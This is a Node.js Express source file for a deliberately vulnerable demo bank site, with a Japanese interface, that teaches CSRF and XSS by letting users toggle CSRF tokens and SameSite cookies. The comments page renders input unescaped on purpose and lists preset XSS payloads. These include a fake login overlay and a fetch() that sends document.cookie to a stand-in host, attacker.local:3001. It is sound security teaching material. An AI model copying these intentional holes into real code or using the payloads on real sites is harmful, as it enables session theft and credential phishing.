// bank.local:3000
const express = require('express')
const crypto = require('crypto')

const app = express()
app.use(express.urlencoded({ extended: true }))

// --- In-memory state ---
const sessions = {}
const comments = []
let csrfProtection = true
let sameSite = 'lax'

// --- Helpers ---
function getSession(req) {
  const raw = req.headers.cookie || ''
  const cookies = Object.fromEntries(
    raw.split(';').filter(Boolean).map(c => c.trim().split('='))
  )
  return sessions[cookies.session]
}

function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}

// --- Routes ---

app.get('/', (req, res) => {
  const session = getSession(req)
  res.send(session ? dashboard(session) : loginPage())
})

app.post('/login', (req, res) => {
  const { username, password } = req.body
  if (password !== 'pass') return res.send('パスワードが違います')
  const sessionId = crypto.randomBytes(16).toString('hex')
  const csrfToken = crypto.randomBytes(16).toString('hex')
  sessions[sessionId] = { username, balance: 10000, csrfToken, log: [] }
  res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; SameSite=${sameSite}; Path=/`)
  res.redirect('/')
})

app.post('/transfer', (req, res) => {
  const session = getSession(req)
  if (!session) return res.status(401).send('<h2>未ログイン（SameSite が効いています）</h2><a href="/">戻る</a>')

  const { to, amount, csrf_token } = req.body

  if (csrfProtection && csrf_token !== session.csrfToken) {
    session.log.push(`❌ 送金ブロック → ${to} へ ¥${amount}（CSRFトークン不一致）`)
    return res.status(403).send(`
      <h2 style="color:green">✅ CSRF をブロックしました</h2>
      <p>トークンが一致しません。攻撃者はこの値を知る術がありません。</p>
      <a href="/">戻る</a>
    `)
  }

  session.balance -= parseInt(amount)
  session.log.push(`💸 送金完了 → ${to} へ ¥${amount}`)
  res.redirect('/')
})

app.post('/comments', (req, res) => {
  comments.push(req.body.comment || '')
  // 投稿後にダッシュボードへ → 仕込んだスクリプトが銀行画面で発火する
  res.redirect('/')
})

app.get('/comments', (req, res) => res.send(commentsPage()))

app.get('/toggle-csrf', (req, res) => {
  csrfProtection = !csrfProtection
  res.redirect('/')
})

app.get('/toggle-samesite', (req, res) => {
  sameSite = sameSite === 'strict' ? 'lax' : 'strict'
  // セッションを破棄して再ログインさせる（新しい SameSite でCookieを発行するため）
  res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
  res.redirect('/')
})

app.get('/logout', (req, res) => {
  res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
  res.redirect('/')
})

app.get('/reset', (req, res) => {
  const session = getSession(req)
  if (session) {
    session.balance = 10000
    session.log = []
  }
  res.redirect('/')
})

// --- HTML ---

function css() {
  return `<style>
    * { box-sizing: border-box; }
    body { font-family: sans-serif; background: #f0f2f5; margin: 0; padding-bottom: 60px; }
    .wrap { max-width: 820px; margin: 32px auto; background: white; padding: 32px; border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
    h1 { margin: 0 0 4px; font-size: 22px; }
    .sub { color: #888; font-size: 13px; margin-bottom: 24px; }
    input, textarea { display: block; width: 100%; margin: 6px 0 12px; padding: 9px 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
    button, .btn { background: #2c3e50; color: white; border: none; padding: 9px 18px; border-radius: 6px; cursor: pointer; font-size: 14px; text-decoration: none; display: inline-block; }
    button:hover, .btn:hover { background: #34495e; }
    .btn-sm { font-size: 12px; padding: 3px 10px; margin-left: 8px; background: #7f8c8d; }
    .settings { background: #f8f9fa; border: 1px solid #e9ecef; padding: 16px 20px; border-radius: 8px; margin: 20px 0; }
    .settings h3 { margin: 0 0 12px; font-size: 15px; }
    .settings p { margin: 6px 0; font-size: 14px; }
    .on { color: #27ae60; font-weight: bold; }
    .off { color: #e74c3c; font-weight: bold; }
    .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px; }
    .col { padding: 16px; border-radius: 8px; }
    .col-bad { background: #fdf2f2; border: 1px solid #f5c6c6; }
    .col-good { background: #f2fdf4; border: 1px solid #c6eece; }
    .col h3 { margin: 0 0 8px; font-size: 14px; }
    .comment-item { border-left: 3px solid #ddd; padding: 6px 10px; margin: 6px 0; font-size: 14px; background: white; border-radius: 0 4px 4px 0; }
    .col-bad .comment-item { border-color: #e74c3c; }
    .col-good .comment-item { border-color: #27ae60; }
    .preset { background: #fafafa; border: 1px solid #eee; padding: 12px 16px; border-radius: 6px; margin: 12px 0; font-size: 13px; }
    .preset p { margin: 0 0 6px; }
    code { background: #f0f0f0; padding: 2px 6px; border-radius: 4px; font-size: 12px; display: block; margin: 4px 0; }
    ul { padding-left: 20px; }
    li { margin: 4px 0; font-size: 14px; }
    hr { border: none; border-top: 1px solid #eee; margin: 24px 0; }
    .footer-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #2c3e50; color: #ccc; padding: 10px 24px; font-size: 13px; }
    .footer-bar a { color: #5dade2; }
    .balance { font-size: 28px; font-weight: bold; color: #2c3e50; }
  </style>`
}

function loginPage() {
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank（victim）</title>${css()}</head><body>
<div class="wrap">
  <h1>🏦 bank.example.com</h1>
  <p class="sub">port 3000 — 被害者サイト（銀行）</p>
  <p>ユーザー名：何でもOK ／ パスワード：<strong>pass</strong></p>
  <form method="POST" action="/login">
    <input name="username" value="alice" placeholder="ユーザー名">
    <input name="password" type="password" value="pass" placeholder="パスワード">
    <button type="submit">ログイン</button>
  </form>
  <hr>
  <a href="/comments" class="btn">💬 コメント掲示板（XSSデモ）を開く</a>
</div>
</body></html>`
}

function dashboard(session) {
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank Dashboard</title>${css()}</head><body>
<div class="wrap">
  <h1>🏦 bank.example.com</h1>
  <p class="sub">port 3000 — ${session.username} さんがログイン中</p>

  <p>残高 <span class="balance">¥${session.balance.toLocaleString()}</span>
    <a href="/reset" class="btn btn-sm">リセット</a>
  </p>

  <div class="settings">
    <h3>⚙️ デモ設定（ここを切り替えて攻撃の成否を確認する）</h3>
    <p>CSRFトークン保護：
      <span class="${csrfProtection ? 'on' : 'off'}">${csrfProtection ? '✅ ON' : '❌ OFF'}</span>
      <a href="/toggle-csrf" class="btn btn-sm">切り替え</a>
    </p>
    <p>Cookie の SameSite：
      <strong>${sameSite}</strong>
      <a href="/toggle-samesite" class="btn btn-sm">切り替え（再ログイン）</a>
      <span style="font-size:12px;color:#888">※ 切り替えるとセッションが切れます</span>
    </p>
  </div>

  <h3>送金フォーム</h3>
  <form method="POST" action="/transfer">
    <input name="to" placeholder="送金先口座">
    <input name="amount" type="number" placeholder="金額" value="1000">
    ${csrfProtection
      ? `<input type="hidden" name="csrf_token" value="${session.csrfToken}">`
      : `<!-- CSRFトークンなし（OFF状態） -->`}
    <button type="submit">送金する</button>
  </form>

  ${session.log.length ? `
  <h3>ログ</h3>
  <ul>${session.log.map(l => `<li>${escapeHtml(l)}</li>`).join('')}</ul>
  ` : ''}

  <hr>

  <h3>💬 最新コメント <span style="font-size:13px;color:#e74c3c;font-weight:normal">← ここが XSS の着弾点</span></h3>
  <p style="font-size:12px;color:#888;margin:0 0 8px">ユーザーの投稿をエスケープなしで表示している（v-html 相当）</p>
  <div id="comments-area">
    ${comments.length
      ? comments.slice(-5).map(c => `<div class="comment-item">${c}</div>`).join('')
      : '<p style="color:#aaa;font-size:13px">まだコメントなし — <a href="/comments">コメント掲示板</a> から投稿してみる</p>'}
  </div>

  <hr>
  <a href="/comments" class="btn">💬 コメントを投稿する（XSSデモ）</a>
  <a href="/logout" class="btn btn-sm" style="margin-left:8px">ログアウト</a>
</div>
<div class="footer-bar">
  CSRFを試すには → <a href="http://attacker.local:3001" target="_blank">attacker.local:3001（攻撃者サイト）</a> を開く
</div>
</body></html>`
}

function commentsPage() {
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>コメント掲示板（XSSデモ）</title>${css()}</head><body>
<div class="wrap">
  <h1>💬 コメント掲示板</h1>
  <p class="sub">XSSデモ — 左右で「エスケープあり/なし」を比較する</p>

  <form method="POST" action="/comments">
    <textarea name="comment" rows="2" placeholder="コメントを入力して投稿..."></textarea>
    <button type="submit">投稿</button>
  </form>

  <p style="font-size:13px;color:#555">投稿するとダッシュボードに戻ります。仕込んだコードが<strong>銀行の画面で</strong>実行されます。</p>

  <div class="preset">
    <p><strong>① 残高を書き換える</strong></p>
    <code>&lt;img src=x onerror="document.querySelector('.balance').textContent='¥0'"&gt;</code>
    <p style="margin-top:10px"><strong>② 画面を乗っ取る（偽のセッション切れ画面）</strong></p>
    <code>&lt;img src=x onerror="document.body.innerHTML='&lt;div style=padding:60px;text-align:center&gt;&lt;h2&gt;セッションが切れました&lt;/h2&gt;&lt;p&gt;再度ログインしてください&lt;/p&gt;&lt;input placeholder=ユーザー名 style=display:block;margin:8px auto;padding:8px&gt;&lt;input type=password placeholder=パスワード style=display:block;margin:8px auto;padding:8px&gt;&lt;button style=padding:8px 20px&gt;ログイン&lt;/button&gt;&lt;/div&gt;'"&gt;</code>
    <p style="margin-top:10px"><strong>③ Cookieを attacker.local に送信する</strong></p>
    <code>&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>
    <p style="font-size:12px;color:#888">③ は attacker.local のターミナルに盗まれた Cookie が表示されます（HttpOnly の場合は空）</p>
  </div>

  <div class="cols">
    <div class="col col-bad">
      <h3>❌ エスケープなし（v-html 相当）</h3>
      <p style="font-size:12px;color:#888">HTMLとして解釈 → タグが実行される</p>
      ${comments.length
        ? comments.map(c => `<div class="comment-item">${c}</div>`).join('')
        : '<p style="color:#aaa;font-size:13px">まだコメントなし</p>'}
    </div>
    <div class="col col-good">
      <h3>✅ エスケープあり（{{ }} 相当）</h3>
      <p style="font-size:12px;color:#888">テキストとして表示 → タグは無害化</p>
      ${comments.length
        ? comments.map(c => `<div class="comment-item">${escapeHtml(c)}</div>`).join('')
        : '<p style="color:#aaa;font-size:13px">まだコメントなし</p>'}
    </div>
  </div>

  <hr>
  <a href="/">← ダッシュボードへ戻る</a>
</div>
</body></html>`
}

app.listen(3000, () => {
  console.log('victim (bank): http://localhost:3000')
})
